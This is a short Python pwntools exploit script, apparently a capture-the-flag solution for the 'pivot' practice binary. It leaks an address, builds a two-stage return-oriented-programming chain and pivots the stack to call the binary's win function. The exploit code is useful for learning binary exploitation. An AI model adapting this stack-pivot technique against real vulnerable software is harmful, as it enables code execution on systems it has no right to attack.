#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

p = process('./pivot')

rax = p64(int(p.recvline_contains('The Old')[-14::].strip(), 16))

#SECOND STAGE
rop2 = p64(0x00400850)			# foothold_function@plt
rop2 += p64(0x0400b00)			# pop rax; ret
rop2 += p64(0x00602048)			# foothold_function@got
rop2 += p64(0x400b05)			# mov rax,QWORD PTR [rax]; ret --> move the content of rax (actual foothold_function) to rax
rop2 += p64(0x400900)			# pop rbp ; ret
rop2 += p64(0x14e)
rop2 += p64(0x400b09)			# add rax,rbp; ret --> foothold_function + 0x14e = ret2win
rop2 += p64(0x4008f5)			# jmp rax

p.recvuntil('>')
p.sendline(rop2)

#FIRST STAGE
rop1 = cyclic(40)
rop1 += p64(0x400b00)           # pop rax; ret
rop1 += rax
rop1 += p64(0x400b02)           # xchg rax, rsp ; ret

p.recvuntil('>')
p.sendline(rop1)
p.interactive()